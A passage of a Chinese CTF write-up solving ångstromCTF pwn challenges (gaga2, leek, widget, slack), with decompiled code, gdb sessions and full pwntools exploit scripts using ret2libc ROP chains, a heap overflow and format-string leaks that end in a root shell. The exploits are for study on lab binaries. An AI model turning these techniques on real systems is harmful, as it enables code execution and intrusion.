'-P'] elf = ELF(&quot;./gaga2&quot;) p = process(&quot;./gaga2&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # step1: leak libc base addr # logsucc(hex(elf.got[&quot;printf&quot;])) rop = ROP(elf) # 创建一个 rop 对象，这时 rop 链还是空的，需要在其中添加函数 rop.puts(elf.got[&quot;printf&quot;]) # 等价于 rop.call('puts', (elf.got[&quot;printf&quot;],)) rop.main() # 回到main函数，那就可以再输入一次了 print(rop.dump()) payload = b'a'*0x48 + rop.chain() # rop.chain() : 返回当前的字节序列，即 payload sla(&quot;Your input: &quot;, payload) printf_addr = u64(rlf().ljust(8, b&quot;\\x00&quot;)) # 接收puts打印出的printf函数 leak(&quot;printf addr&quot;, printf_addr) libc_addr = printf_addr - libc.symbols[&quot;printf&quot;] libc.address = libc_addr # 将计算结果赋值给libc对象的address，这样后面算/bin/sh的地址的时候就不用再加基址了 leak(&quot;libc addr&quot;, libc.address) # step2: rop，将main函数的ret覆盖成system(&quot;/bin/sh&quot;) rop2 = ROP(libc) # find_gadget(instructions): Returns a gadget with the exact sequence of instructions specified in the instructions argument. # raw(value): Adds a raw integer or string to the ROP chain. If your architecture requires aligned values, then make sure that any given string is aligned! rop2.raw(rop2.find_gadget([&quot;ret&quot;])) # 【注意2】ubuntu18开始，执行system函数需要栈对齐（16字节对齐），我先试了不加这条指令，是没有对齐的，所以这里加一条ret指令，令栈对齐 rop2.system(next(libc.search(b&quot;/bin/sh&quot;))) print(rop2.dump()) payload2 = b'a'*0x48 + rop2.chain() sla(&quot;Your input: &quot;, payload2) itr() 结果如下： root@e289eaa0da06:/chal# python3 exp2.py [*] '/chal/gaga2' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './gaga2' argv=[b'./gaga2'] : pid 394 [*] '/lib/x86_64-linux-gnu/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] Loaded 14 cached gadgets for './gaga2' 0x0000: 0x4012b3 pop rdi; ret 0x0008: 0x404030 [arg0] rdi = got.printf 0x0010: 0x401094 puts 0x0018: 0x4011d6 main() [DEBUG] Received 0x44 bytes: b&quot;Awesome! Now there's no system(), so what will you do?!\\n&quot; b'Your input: ' [DEBUG] Sent 0x69 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000040 61 61 61 61 61 61 61 61 b3 12 40 00 00 00 00 00 │aaaa│aaaa│··@·│····│ 00000050 30 40 40 00 00 00 00 00 94 10 40 00 00 00 00 00 │0@@·│····│··@·│····│ 00000060 d6 11 40 00 00 00 00 00 0a │··@·│····│·│ 00000069 [DEBUG] Received 0x4b bytes: 00000000 70 e7 e7 9e 19 7f 0a 41 77 65 73 6f 6d 65 21 20 │p···│···A│weso│me! │ 00000010 4e 6f 77 20 74 68 65 72 65 27 73 20 6e 6f 20 73 │Now │ther│e's │no s│ 00000020 79 73 74 65 6d 28 29 2c 20 73 6f 20 77 68 61 74 │yste│m(),│ so │what│ 00000030 20 77 69 6c 6c 20 79 6f 75 20 64 6f 3f 21 0a 59 │ wil│l yo│u do│?!·Y│ 00000040 6f 75 72 20 69 6e 70 75 74 3a 20 │our │inpu│t: │ 0000004b [+] printf addr = 0x7f199ee7e770 [+] libc addr = 0x7f199ee1e000 [*] Loaded 218 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6' 0x0000: 0x7f199ee47cd6 ret 0x0008: 0x7f199ee483e5 pop rdi; ret 0x0010: 0x7f199eff6698 [arg0] rdi = 139748018448024 0x0018: 0x7f199ee6ed60 system [DEBUG] Sent 0x69 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000040 61 61 61 61 61 61 61 61 d6 7c e4 9e 19 7f 00 00 │aaaa│aaaa│·|··│····│ 00000050 e5 83 e4 9e 19 7f 00 00 98 66 ff 9e 19 7f 00 00 │····│····│·f··│····│ 00000060 60 ed e6 9e 19 7f 00 00 0a │`···│····│·│ 00000069 [*] Switching to interactive mode $ id [DEBUG] Sent 0x3 bytes: b'id\\n' [DEBUG] Received 0x27 bytes: b'uid=0(root) gid=0(root) groups=0(root)\\n' uid=0(root) gid=0(root) groups=0(root) $ cat flag.txt [DEBUG] Sent 0xd bytes: b'cat flag.txt\\n' [DEBUG] Received 0x11 bytes: b'flag{aaaaaaaaaa}\\n' flag{aaaaaaaaaa} $ 2.3 调试 以前都是在虚拟机里做题，如果调试，直接gdb.attach(p)就ok了。现在在docker里调试，步骤如下： 1、进入tmux 2、python脚本：context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] 3、python脚本：gdb.attach(p) 4、执行python脚本 pwnlib.gdb.attach(target, gdbscript='', exe=None, gdb_args=None, ssh=None, sysroot=None, api=False) pwnlib.gdb.attach - API介绍 计算栈中变量距离ret可用两个API：cyclic(num)和cyclic_find(string)。 最终还是调了一下gaga0： sla(&quot;Your input: &quot;, cyclic(0x100)) 可以看到main函数的返回地址被覆盖成了0x6161617461616173，对应的字符是：saaataaa。 offset = cyclic_find(&quot;saaa&quot;) logsucc(hex(offset)) 打印结果看到是0x48 root@870aeb6e392e:/chal# python3 exp0.py ...... [+] 0x48 ...... 3 leek Dockerfile如下： FROM pwn.red/jail COPY --from=ubuntu:22.04 / /srv COPY leek /srv/app/run COPY flag.txt /srv/app/flag.txt RUN chmod 755 /srv/app/run 该程序运行在Ubuntu22环境中，同时又有flag.txt。 3.1 运行 root@3d0b9610b107:/chal# ./leek I dare you to leek my secret. Your input (NO STACK BUFFER OVERFLOWS!!): hello :skull::skull::skull: bro really said: hello So? What's my secret? aaa Wrong! root@3d0b9610b107:/chal# checksec leek [*] '/chal/leek' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 开启了Canary和NX，PIE是关闭的。 3.2 反编译 简单扫几眼main函数，最后调用win函数，点进去一看，功能是打印flag:)。所以大概就是让想办法使程序能走到最后。首先找前面有没有程序结束点，其他看注释吧。 main int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int i; // [rsp+0h] [rbp-50h] int j; // [rsp+4h] [rbp-4Ch] __gid_t rgid; // [rsp+8h] [rbp-48h] char *v9; // [rsp+10h] [rbp-40h] void *s; // [rsp+18h] [rbp-38h] char s2[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v12; // [rsp+48h] [rbp-8h] v12 = __readfsqword(0x28u); v3 = time(0LL); srand(v3); setbuf(stdout, 0LL); setbuf(stdin, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); puts(&quot;I dare you to leek my secret.&quot;); for ( i = 0; i &lt; N; ++i ) // 【12】循环100次 { v9 = (char *)malloc(0x10uLL); s = malloc(0x20uLL); // 【4】s是分配的堆块 memset(s, 0, 0x20uLL); getrandom(s, 32LL, 0LL); // 【5】s填充为随机数 for ( j = 0; j &lt;= 31; ++j ) { if ( !*((_BYTE *)s + j) || *((_BYTE *)s + j) == 10 )// 【6】如果s中有NULL或者回车符，则将其替换为数字1 *((_BYTE *)s + j) = 1; } printf(&quot;Your input (NO STACK BUFFER OVERFLOWS!!): &quot;); input(v9); // 【7】v9是内容大小为0x10的chunk，然后传入input函数存储输入 printf(&quot;:skull::skull::skull: bro really said: &quot;); puts(v9); // 【10】打印v9 printf(&quot;So? What's my secret? &quot;); fgets(s2, 33, stdin); // 【3】s2是输入（0x21 Byte） if ( strncmp((const char *)s, s2, 0x20uLL) )// 【2】要让s和s2的前0x20字节相等 { puts(&quot;Wrong!&quot;); // 【1】不能让程序走到这里 exit(-1); } puts(&quot;Okay, I'll give you a reward for guessing it.&quot;); printf(&quot;Say what you want: &quot;); gets(v9); // 【11】再次往v9输入，也可以溢出 puts(&quot;Hmm... I changed my mind.&quot;); free(s); free(v9); puts(&quot;Next round!&quot;); } puts(&quot;Looks like you made it through.&quot;); win(); return v12 - __readfsqword(0x28u); } input unsigned __int64 __fastcall input(void *input_buffer1) { size_t v1; // rax char s[1288]; // [rsp+10h] [rbp-510h] BYREF unsigned __int64 v4; // [rsp+518h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(s, 1280, stdin); // 【8】往1288大小的s中输入数据 v1 = strlen(s); memcpy(input_buffer1, s, v1); // 【9】将输入拷贝到传入的input_buffer中，也就是main函数中的v9，这会导致v9堆溢出 return v4 - __readfsqword(0x28u); } win unsigned __int64 win() { FILE *stream; // [rsp+8h] [rbp-98h] char s[136]; // [rsp+10h] [rbp-90h] BYREF unsigned __int64 v3; // [rsp+98h] [rbp-8h] v3 = __readfsqword(0x28u); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( !stream ) { puts(&quot;Error: missing flag.txt.&quot;); exit(1); } fgets(s, 128, stream); puts(s); return v3 - __readfsqword(0x28u); } 看完代码，思路就清晰了：s和v9都指向堆块，两chunk连续，且v9在s上方（地址更低）。很明显，绕过if判断有两种方法：1）利用溢出修改chunk s，然后输入s2的时候溢出的内容；2）利用溢出泄露chunk s的内容，然后输入s2的时候输入泄露的内容。 if判断之后还有一次输入，这次输入能随意？不行，需要利用这次输入修复chunk s的size，不然执行到free的时候你就会发现，ptmalloc2会检查chunk的size：打印double free or corruption (out)，并导致程序退出。注意循环100次。 3.3 exp from pwn import * import warnings warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) rl = lambda drop=True :p.recvline(drop) rlf = lambda drop=False :p.recvline(drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序 context.log_level = 'DEBUG' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] def dbg(): gdb.attach(p) # pause() elf = ELF(&quot;./leek&quot;) p = process(&quot;./leek&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) for i in range(100): # method1 payload = b'a'*(0x20) + b'z'*0x20 sla(&quot;): &quot;, payload) # dbg() # 下面这里不能使用sla，而需要使用sa。 # 如果用sla，那么输入的字符串长度就是0x22了，即最后两个字符是\\n\\x00，把前0x21个字符给s2后，缓冲区里还剩1个\\x00 # 那么后面执行gets(v9)的时候，从stdin输入的第一个字符就是\\x00，那就不能再修复chunk 的size字段了 sa(&quot;secret? &quot;, b'z'*0x20) sla(&quot;want: &quot;,b'a'*0x18 + p64(0x31)) # method2 # payload = b'a'*(0x20-1) # 减1是留空间给\\n，这样刚好填满chunk s的prev_size和size字段 # sla(&quot;): &quot;, payload) # ru(&quot;\\n&quot;) # 接收刚刚输入的内容 # leak = r(0x20) # 接收chunk s中的随机数 # print(leak) # sa(&quot;secret? &quot;, leak) # sla(&quot;want: &quot;, b'b'*0x18 + p64(0x31)) itr() 4 widget I seem to have lost my gadgets. 4.1 运行 关闭了Canary（栈溢出覆盖ret简单多了）和PIE（不用泄露地址了），开启了NX。 root@5289895e8b8a:/chal# ./widget Amount: 12 Contents: 2344 Your input: 2344 root@5289895e8b8a:/chal# checksec widget [*] '/chal/widget' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 4.2 反编译 函数列表里又有win函数。 main int __cdecl main(int argc, const char **argv, const char **envp) { int amount; // [rsp+Ch] [rbp-24h] BYREF char buf[24]; // [rsp+10h] [rbp-20h] BYREF buf距离rbp 0x20 __gid_t rgid; // [rsp+28h] [rbp-8h] unsigned int i; // [rsp+2Ch] [rbp-4h] setbuf(_bss_start, 0LL); setbuf(stdin, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); if ( called ) exit(1); called = 1; // 这个变量使得main函数只允许执行一次 printf(&quot;Amount: &quot;); amount = 0; __isoc99_scanf(&quot;%d&quot;, &amp;amount); // 输入amount getchar(); if ( amount &lt; 0 ) // amount需要&gt;=0 exit(1); printf(&quot;Contents: &quot;); read(0, buf, amount); // 读取amount长度的数据到buf for ( i = 0; (int)i &lt; amount; ++i ) { if ( buf[i] == 'n' ) // amount长度的buf里不能含有n这个字符 { printf(&quot;bad %d\\n&quot;, i); exit(1); } } printf(&quot;Your input: &quot;); return printf(buf); // 格式化字符串漏洞 } win int __fastcall win(const char *a1, const char *a2) { char s[136]; // [rsp+10h] [rbp-90h] BYREF FILE *stream; // [rsp+98h] [rbp-8h] if ( strncmp(a1, &quot;14571414c5d9fe9ed0698ef21065d8a6&quot;, 0x20uLL) )// 第一个参数需要等于这个字符串 exit(1); if ( strncmp(a2, &quot;willy_wonka_widget_factory&quot;, 0x1AuLL) )// 第二个参数需要等于这个字符串 exit(1); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); // 打印flag.txt内容。一样，可以尝试直接跳转到这里来绕过前面的if判断 if ( !stream ) { puts(&quot;Error: missing flag.txt.&quot;); exit(1); } fgets(s, 128, stream); return puts(s); } 理一理思路： 1、利用栈溢出覆盖main函数的ret为win函数中开始读flag.txt的地方。 2、看看读flag.txt的地方会不会使用到rbp，如下面的代码，是会的。 .text:000000000040130B loc_40130B: ; CODE XREF: win+69↑j .text:000000000040130B lea rax, modes ; &quot;r&quot; .text:0000000000401312 mov rsi, rax ; modes .text:0000000000401315 lea rax, filename ; &quot;flag.txt&quot; .text:000000000040131C mov rdi, rax ; filename .text:000000000040131F call _fopen .text:0000000000401324 mov [rbp+stream], rax .text:0000000000401328 cmp [rbp+stream], 0 找个可读可写的地址： pwndbg&gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File ...... 0x404000 0x405000 rw-p 1000 3000 /chal/widget 这个过程中没有其他阻碍了，非常简单，格式化字符串漏洞也没用到。exp如下。 4.3 exp from pwn import * import warnings import subprocess warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) rl = lambda drop=True :p.recvline(drop) rlf = lambda drop=False :p.recvline(drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序 context.log_level = 'DEBUG' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] def dbg(): gdb.attach(p) # pause() elf = ELF(&quot;./widget&quot;) p = process(&quot;./widget&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # p = remote(&quot;&quot;,&quot;&quot;) # ru(&quot;proof of work: &quot;) # pow = rl() # sla(&quot;solution: &quot;, subprocess.check_output(pow, shell=True, text=True)) sla(b&quot;Amount: &quot;,str(0x30)) # 这个值其实只要够大就可以 payload = b'a'* 0x20 + p64(0x404500) + p64(0x40130B) sla(&quot;Contents: &quot;, payload) itr() 这道题用到了proof of work，在上面 exp 的注释中记录了相应的接收发送代码。 4.4 exp2 还有另一种解法，第一次溢出的时候，利用格式化字符串漏洞泄漏libc地址，然后ret覆盖为printf(&quot;Amount: &quot;);的地址，绕过called的限制；第二次溢出的时候，ret覆盖为rop链地址，拿到shell，最后cat flag.txt。 .text:00000000004013D9 loc_4013D9: ; CODE XREF: main+5B↑j &lt;-- 第一次溢出ret选这个地址 .text:00000000004013D9 mov cs:called, 1 .text:00000000004013E3 lea rax, format ; &quot;Amount: &quot; .text:00000000004013EA mov rdi, rax ; format .text:00000000004013ED mov eax, 0 .text:00000000004013F2 call _printf 这有个问题，libc地址怎么泄漏？栈里应该有libc的地址，那么利用格式化字符串漏洞可以泄漏出来。而且这个地址应该和libc基址的偏移应该是不变的。于是，通过gdb计算出这个偏移，然后泄漏出地址，再一算就能拿到libc基址了。 所以，偏移是0x7ff82fb37a37 - 0x7ff82fa23000 exp如下： from pwn import * import warnings import subprocess warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) rl = lambda drop=True :p.recvline(drop) rlf = lambda drop=False :p.recvline(drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.clear(arch='amd64') # 【注意】加上架构信息，不然rop模块会把该程序当成32位程序 context.log_level = 'DEBUG' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] def dbg(): gdb.attach(p) # pause() elf = ELF(&quot;./widget&quot;) p = process(&quot;./widget&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # p = remote(&quot;&quot;,&quot;&quot;) # ru(&quot;proof of work: &quot;) # pow = rl() # sla(&quot;solution: &quot;, subprocess.check_output(pow, shell=True, text=True)) # step1: leak libc base address sla(b&quot;Amount: &quot;,str(0x30)) # 这个值其实只要够大就可以 # 4个字符 * 6 + 8个随意字符 + rbp + ret payload = b'%p '* 6 + b'xxxxxxxx' + p64(0x404500)+ p64(0x4013D9) #p64(0x4013E3) sla(&quot;Contents: &quot;, payload) ru(&quot;Your input: &quot;) leak_data = ru(&quot;xxxx&quot;).decode() leak_data_list = leak_data.split(&quot; &quot;) print(leak_data_list) leak_libc_addr = int(leak_data_list[2],16) leak(&quot;libc_some_addr&quot;, leak_libc_addr) libc.address = leak_libc_addr - (0x7ff82fb37a37 - 0x7ff82fa23000) leak(&quot;libc_base_addr&quot;, libc.address) # dbg() # step2: rop rop = ROP(libc) # rop.raw(rop.find_gadget([&quot;ret&quot;])) # 用system gadget失败了，原因待分析，不过做题的时候不用管，哪个不行就换另一个 # rop.system(next(libc.search(b&quot;/bin/sh&quot;))) #### execve(&quot;/bin/sh&quot;, 0, 0) rop.execve(next(libc.search(b&quot;/bin/sh&quot;)), 0, 0) print(rop.dump()) sla(b&quot;Amount: &quot;,str(0x100)) # 这次写大点 payload = b'a'* 0x20 + p64(0x404500) + rop.chain() sla(&quot;Contents: &quot;, payload) itr() 5 slack Join the ångstromCTF slack! 该题运行在Ubuntu22的环境中 FROM pwn.red/jail COPY --from=ubuntu:22.04 / /srv COPY slack /srv/app/run COPY flag.txt /srv/app/flag.txt RUN chmod 755 /srv/app/run 5.1 运行 这是模拟一个聊天软件？有一个机器人提醒你一些事情？有三次输入的机会。保护全开。 root@8edd47208f9e:/chal# ./slack Welcome to slack (not to be confused with the popular chat service Slack)! 2023-07-13 15:46:16 -- slack Bot: Hi there! Just wanted to remind you that your weekly team meeting starts in 10 minutes. Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa 2023-07-13 15:46:16 -- You: aaaa 2023-07-13 15:46:16 -- slack Bot: Don't forget to fill out your time sheet for the week by 5 pm today. Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa 2023-07-13 15:46:16 -- You: aaaa 2023-07-13 15:46:16 -- slack Bot: Just a heads up - the office will be closed on Friday for a company-wide retreat. Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa 2023-07-13 15:46:16 -- You: aaaa root@8edd47208f9e:/chal# checksec slack [*] '/chal/slack' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 5.2 反编译 循环3次，每次都能触发同一个格式化字符串漏洞。 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int v4; // eax int i; // [rsp+8h] [rbp-68h] __gid_t rgid; // [rsp+Ch] [rbp-64h] time_t timer; // [rsp+10h] [rbp-60h] BYREF struct tm *tp; // [rsp+18h] [rbp-58h] char s[32]; // [rsp+20h] [rbp-50h] BYREF char format[40]; // [rsp+40h] [rbp-30h] BYREF unsigned __int64 v13; // [rsp+68h] [rbp-8h] v13 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); setbuf(stdin, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); puts(&quot;Welcome to slack (not to be confused with the popular chat service Slack)!&quot;); timer = time(0LL); tp = localtime(&amp;timer); v3 = time(0LL); srand(v3); for ( i = 0; i &lt;= 2; ++i ) // 循环3次 { strftime(s, 0x1AuLL, &quot;%Y-%m-%d %H:%M:%S&quot;, tp);// 生成时间字符串 v4 = rand(); printf(&quot;%s -- slack Bot: %s\\n&quot;, s, (&amp;messages)[v4 % 8]);// 随机打印messages里的句子，里面有8句 printf(&quot;Your message (to increase character limit, pay $99 to upgrade to Professional): &quot;); fgets(format, 14, stdin); // 输入数据到format，最多14Byte tp = localtime(&amp;timer); strftime(s, 0x1AuLL, &quot;%Y-%m-%d %H:%M:%S&quot;, tp);// 再次生成时间字符串 printf(&quot;%s -- You: &quot;, s); printf(format); // 打印前面输入的format。格式化字符串漏洞 putchar(10); // 打印换行 } return v13 - __readfsqword(0x28u); } 保护全开，这里也只有格式化字符串漏洞，那就只能想办法覆盖ret了。 1）覆写ret，那首先需要泄漏出栈里存放ret的地址 2）然后，覆盖为rop链的地址，那还需要泄漏出libc基址 所以总体思路： 1）泄漏栈和libc的地址 2）覆写ret为rop链的地址 5.3 调试 5.3.1 泄露栈地址和libc地址 首先，想要通过格式化字符串漏洞泄露栈上的内容，一般都会在输入时敲很多%p，但是注意，这里的每次输入最多14Byte。所以为了方便查看结果，以及不用敲那么多次输入，用脚本： from pwn import * import warnings import subprocess warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) rl = lambda drop=True :p.recvline(drop) rlf = lambda drop=False :p.recvline(drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.clear(arch='amd64') # context.log_level = 'DEBUG' context.log_level = 'CRITICAL' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] def dbg(): gdb.attach(p) # pause() elf = ELF(&quot;./slack&quot;) # p = process(&quot;./slack&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # 循环16次，打印%i$p for i in range(0x10): p = process(&quot;./slack&quot;) sla(b&quot;): &quot;, f&quot;%{i}$p&quot;) ru(&quot;You: &quot;) data = rl().strip() print(f&quot;{i=} {data=}&quot;) p.close() 执行两次，结果如下： root@8edd47208f9e:/chal# python3 exp.py i=0 data=b'%0$p' i=1 data=b'0x7fff6f4d5620' &lt;--- 0x7ff -&gt; 栈地址 i=2 data=b'(nil)' i=3 data=b'0x7fdc7e7b2a37' &lt;--- 这个变化有点大 i=4 data=b'0x1c' i=5 data=b'0x7fffffff' i=6 data=b'(nil)' i=7 data=b'(nil)' i=8 data=b'0x64b18516' i=9 data=b'0x7f654113a6a0' &lt;--- 选这个来计算libc地址 i=10 data=b'0x2d37302d33323032' i=11 data=b'0x35323a3731203431' i=12 data=b'0x32343a' i=13 data=b'(nil)' i=14 data=b'0xa7024343125' i=15 data=b'(nil)' root@8edd47208f9e:/chal# python3 exp.py i=0 data=b'%0$p' i=1 data=b'0x7ffe90dc0320' &lt;--- i=2 data=b'(nil)' i=3 data=b'0x7f02f86a3a37' &lt;--- i=4 data=b'0x1c' i=5 data=b'0x7fffffff' i=6 data=b'(nil)' i=7 data=b'(nil)' i=8 data=b'0x64b18517' i=9 data=b'0x7f137e5e76a0' &lt;--- i=10 data=b'0x2d37302d33323032' i=11 data=b'0x35323a3731203431' i=12 data=b'0x33343a' i=13 data=b'(nil)' i=14 data=b'0xa7024343125' i=15 data=b'(nil)' 接着，用gdb确认一下这两个index是否是stack和libc的地址，并计算偏移： # step1: leak stack/libc sla(b&quot;): &quot;, &quot;%1$p %9$p&quot;) ru(&quot;You: &quot;) data = rl().strip().decode().split() some_stack_addr = data[0] some_libc_addr = data[1] logsucc(&quot;some_stack_addr = &quot; + some_stack_addr) logsucc(&quot;some_libc_addr = &quot; + some_libc_addr) dbg() itr() ret_addr - some_stack_addr = 0x7ffc8fb1e328 - 0x7ffc8fb1c190 libc_base_addr - some_libc_addr = 0x7f35e31bf000 - 0x7f35e33df6a0 验证之后，毛有问题。 # step1: leak stack/libc sla(b&quot;): &quot;, &quot;%1$p %9$p&quot;) ru(&quot;You: &quot;) data = rl().strip().decode().split() some_stack_addr = data[0] some_libc_addr = data[1] logsucc(&quot;some_stack_addr = &quot; + some_stack_addr) logsucc(&quot;some_libc_addr = &quot; + some_libc_addr) main_ret_addr = int(some_stack_addr,16) + (0x7ffc8fb1e328 - 0x7ffc8fb1c190) libc_base_addr = int(some_libc_addr,16) + (0x7f35e31bf000 - 0x7f35e33df6a0) libc.address = libc_base_addr leak(&quot;main_ret_addr&quot;, main_ret_addr) leak(&quot;libc_base_addr&quot;, libc_base_addr) dbg() itr() 5.3.2 修改变量i的值为一个大负数 还有两次触发机会。接下来需要把一个rop链的地址写到main_ret_addr里，也就是要把一个大数（8字节）写入到某个地址，那这需要一个字节一个字节写。还是那个问题，输入长度有限，不能一次性写长的payload，而现在触发printf的机会也只剩两次了。那可以修改局部变量i为一个负数来增加循环次数，从而增加触发printf的机会。 要覆写i为一个负数，首先来看一下i的地址： int i; // [rsp+8h] [rbp-68h] 那么泄露i的地址： # step2: set i to some negative number i_addr = main_ret_addr - (0x68+8) leak(&quot;i_addr&quot;, i_addr) 结果如下： root@8edd47208f9e:/chal# python3 exp.py ...... [+] i_addr = 0x7fff1d91b458 对于整型变量i来说，其内容为4个字节， 00 00 00 01 addr+3 addr 要将其值变成负数，最简单的方法就是把最高的一个字节变成0xff（256）。 (i_addr+3) + &quot;%kc%j$hhn&quot; 8Byte 最少9Byte 很明显，输入空间不足以支撑。需要另想办法，如下图。 一步一步来，先来看看循环第二次时，call printf时栈的情况： root@8edd47208f9e:/chal# gdb slack ...... pwndbg&gt; b *main+402 Breakpoint 1 at 0x145b pwndbg&gt; r ...... pwndbg&gt; stack 50 00:0000│ rsp 0x7ffe27708e20 ◂— 0x0 01:0008│ 0x7ffe27708e28 ◂— 0x1 &lt;--- 这个是变量i 02:0010│ 0x7ffe27708e30 ◂— 0x64b26afd 03:0018│ 0x7ffe27708e38 —▸ 0x7ff6be6e56a0 (_tmbuf) ◂— 0x2e00000025 /* '%' */ 04:0020│ 0x7ffe27708e40 ◂— '2023-07-15 09:46:37' 05:0028│ 0x7ffe27708e48 ◂— '15 09:46:37' 06:0030│ 0x7ffe27708e50 ◂— 0x37333a /* ':37' */ 07:0038│ 0x7ffe27708e58 ◂— 0x0 08:0040│ rdi 0x7ffe27708e60 ◂— 'BBBBBBBB\\n' 09:0048│ 0x7ffe27708e68 ◂— 0xa /* '\\n' */ 0a:0050│ 0x7ffe27708e70 ◂— 0x0 ... ↓ 2 skipped 0d:0068│ 0x7ffe27708e88 ◂— 0x1109c51ee9704900 0e:0070│ rbp 0x7ffe27708e90 ◂— 0x1 0f:0078│ 0x7ffe27708e98 —▸ 0x7ff6be4eed90 (__libc_start_call_main+128) ◂— mov edi, eax 10:0080│ 0x7ffe27708ea0 ◂— 0x0 11:0088│ 0x7ffe27708ea8 —▸ 0x55e4931932c9 (main) ◂— endbr64 12:0090│ 0x7ffe27708eb0 ◂— 0x100000000 13:0098│ 0x7ffe27708eb8 —▸ 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack'&lt;---[1]这个，它指向下面的内存[2] 14:00a0│ 0x7ffe27708ec0 ◂— 0x0 15:00a8│ 0x7ffe27708ec8 ◂— 0xba423f3e3c4e0a1f 16:00b0│ 0x7ffe27708ed0 —▸ 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack'&lt;---或者这个 17:00b8│ 0x7ffe27708ed8 —▸ 0x55e4931932c9 (main) ◂— endbr64 18:00c0│ 0x7ffe27708ee0 —▸ 0x55e493195d60 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55e493193280 (__do_global_dtors_aux) ◂— endbr64 19:00c8│ 0x7ffe27708ee8 —▸ 0x7ff6be72e040 (_rtld_global) —▸ 0x7ff6be72f2e0 —▸ 0x55e493192000 ◂— 0x10102464c457f 1a:00d0│ 0x7ffe27708ef0 ◂— 0x45be71df210c0a1f 1b:00d8│ 0x7ffe27708ef8 ◂— 0x45af43a3e6c40a1f 1c:00e0│ 0x7ffe27708f00 ◂— 0x7ff600000000 1d:00e8│ 0x7ffe27708f08 ◂— 0x0 ... ↓ 3 skipped 21:0108│ 